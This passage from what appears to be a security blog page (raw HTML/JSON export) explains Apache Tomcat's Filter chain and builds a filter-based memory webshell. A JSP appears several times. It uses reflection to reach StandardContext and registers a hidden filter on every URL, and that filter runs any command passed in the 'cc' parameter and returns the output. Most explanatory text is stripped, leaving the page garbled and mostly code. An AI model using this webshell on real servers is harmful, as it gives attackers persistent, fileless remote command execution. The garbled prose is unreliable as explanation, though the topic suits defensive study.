class=\"line\"></span><br><span class=\"line\">    //filterMap</span><br><span class=\"line\">    FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">    filterMap.setFilterName(filtername);</span><br><span class=\"line\">    // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3</span><br><span class=\"line\">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterMaps</span><br><span class=\"line\">    standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterconfigs</span><br><span class=\"line\">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">    Configs.setAccessible(true);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">    filterConfigs.put(filtername,filterConfig);</span><br><span class=\"line\">    out.print(&quot;bingo&quot;);</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h2 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h2><p>FilterservletservletservletFilter <code>web.xml</code>Filter</p>\n<p>FilterFilterFilterservletFilterFilterchain</p>\n<h3 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>Filterdemo</p>\n<p>testfilter.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import javax.servlet.*;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class testfilter implements Filter&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;filter&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;dofilter&quot;);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>web.xml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class=\"line\">         version=&quot;4.0&quot;&gt;</span><br><span class=\"line\">    &lt;filter&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;filter-class&gt;testfilter&lt;/filter-class&gt;</span><br><span class=\"line\">    &lt;/filter&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;filter-mapping&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/filter-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;!--servlet--&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--class--&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;test&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--url--&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>\n\n<p> <code>/filter</code></p>\n<p></p>\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>from <a class=\"link\"   href=\"https://paper.seebug.org/1441/#tomcat\" >https://paper.seebug.org/1441/#tomcat<i class=\"fas fa-external-link-alt\"></i></a></p>\n<ul>\n<li><p><strong>Filter</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Filter  Java  Filter javax.servlet.Filter init(Web  Filter  Filter  init )doFilter( Filter Servlet  Filter  doFilter )destory( Web  Filter )</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> FilterChain  doFilter()  Filter  Filter.FilterFilterChain, FilterFilterChain</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">, Servlet Filter  Servlet Servlet  ServletContext  Filter  FilterConfig FilterConfig  FilterConfig  Filter  ServletContext  web.xml  Filter </span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterDef</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterFactory</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>WebXml</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web.xml</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ContextConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web(Context)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardWrapperValve</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Wrapperservlet</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"Tomcat-Filter\"><a href=\"#Tomcat-Filter\" class=\"headerlink\" title=\"Tomcat Filter\"></a>Tomcat Filter</h3><p> <code>ContextConfig$configureContext</code>  <code>web.xml</code>  <code>WebXml</code> </p>\n<p> <code>StandardWrapperValve</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>\n\n<p> <code>filterchain</code>  <code>ApplicationFilterFactory$createFilterChain</code> </p>\n<p> <code>filterchain</code>  <code>StandardWrapper$getParent</code>  <code>Context</code> WEB <code>Context</code>  <code>findFilterMaps</code>  <code>filterMaps</code></p>\n<p><code>filterMaps</code>  <code>filterMap</code>  <code>filterMap</code>  filtername  url <code>filter</code> </p>\n<p><code>for</code>  <code>filterMaps</code>  <code>url</code>  <code>filterMap</code>  <code>urlPatterns</code>  <code>findFilterConfig</code>  <code>filtername</code>  <code>FilterConfig</code>  <code>addFilter</code>  <code>filterConfig</code>  <code>filterChain</code></p>\n<p> <code>addFilter</code>  <code>filterChain</code>  <code>filter</code>  <code>return</code></p>\n<p>n <code>filters</code>  <code>filters</code>  <code>filterChain</code>  <code>StandardWrapperValve</code>  <code>ApplicationFilterChain$doFilter</code></p>\n<p> <code>doFilter</code> </p>\n<p> <code>internalDoFilter</code> </p>\n<p> <code>filterConfig</code>  <code>filterConfig.getFilter()</code>  <code>filter</code>  <code>filter</code>  <code>doFilter</code>  Filter </p>\n<p></p>\n<ul>\n<li> <code>Context</code>  <code>filterMaps</code></li>\n<li> <code>urlPattern</code>  url  <code>filtername</code></li>\n<li> <code>filtername</code>  <code>FilterConfig</code></li>\n<li> <code>FilterConfig</code>  <code>filterChain</code></li>\n<li> <code>filterChain</code>  <code>internalDoFilter</code>  <code>FilterConfig</code></li>\n<li> <code>FiletrConfig</code>  <code>Filter</code>  <code>Filter</code>  <code>doFilter</code></li>\n</ul>\n<h2 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a>filter</h2><p>filterdemo <code>filter</code> </p>\n<p> <code>filter</code>  <code>filterMaps</code>  <code>context</code> </p>\n<p> <code>context</code>  <code>filterMaps</code>  <code>filter</code> </p>\n<p> <code>context</code>  <code>StandardContext</code>  <code>filter</code> </p>\n<ul>\n<li>filterConfigs <code>filterConfig</code>  <code>HashMap</code>  <code>filterConfig</code>  <code>FilterDef</code>  <code>filter</code> </li>\n<li>filterDefs <code>FilterDef</code>  <code>HashMap</code> <strong>FilterDef</strong>url </li>\n<li>filterMaps <code>FilterMap</code>  <code>HashMap</code>  <code>FilterMap</code>  <code>FilterName</code>  <code>URLPattern</code></li>\n</ul>\n<p></p>\n<ul>\n<li> <code>filter</code></li>\n<li> <code>FilterDef</code>  <code>filter</code></li>\n<li> <code>FilterDef</code>  <code>FilterDefs</code>  <code>FilterConfig</code></li>\n<li> <code>filter</code>  <code>filterMap</code>  <code>filterMaps</code> ()</li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//filter</span><br><span class=\"line\">        Filter filter=new Filter() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">                if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                    byte[] bytes = new byte[1024];</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        //filter</span><br><span class=\"line\">        String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">        FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(filtername);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterdeffilterdefs</span><br><span class=\"line\">        standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterdeffilterconfig</span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(true);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterMap</span><br><span class=\"line\">        FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">        filterMap.setFilterName(filtername);</span><br><span class=\"line\">        // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterMaps</span><br><span class=\"line\">        standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterconfigs</span><br><span class=\"line\">        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">        Configs.setAccessible(true);</span><br><span class=\"line\">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">        filterConfigs.put(filtername,filterConfig);</span><br></pre></td></tr></table></figure>\n\n<p> <code>context</code>  <code>context</code>,</p>\n<ul>\n<li><p><strong> <code>servletcontext</code>  <code>StandardContext</code></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">webwebservletcontextweb</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">        // ApplicationContext  ServletContext </span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong><strong>Mbeancontext</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filter</span><br><span class=\"line\">    Filter filter=new Filter() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">            HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">            if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                byte[] bytes = new byte[1024];</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //filter</span><br><span class=\"line\">    String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">    FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">    filterDef.setFilter(filter);</span><br><span class=\"line\">    filterDef.setFilterName(filtername);</span><br><span class=\"line\">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterdeffilterdefs</span><br><span class=\"line\">    standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterdeffilterconfig</span><br><span class=\"line\">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">    constructor.setAccessible(true);</span><br><span class=\"line\">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterMap</span><br><span class=\"line\">    FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">    filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">    filterMap.setFilterName(filtername);</span><br><span class=\"line\">    // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3</span><br><span class=\"line\">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterMaps</span><br><span class=\"line\">    standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterconfigs</span><br><span class=\"line\">    Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">    Configs.setAccessible(true);</span><br><span class=\"line\">    Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">    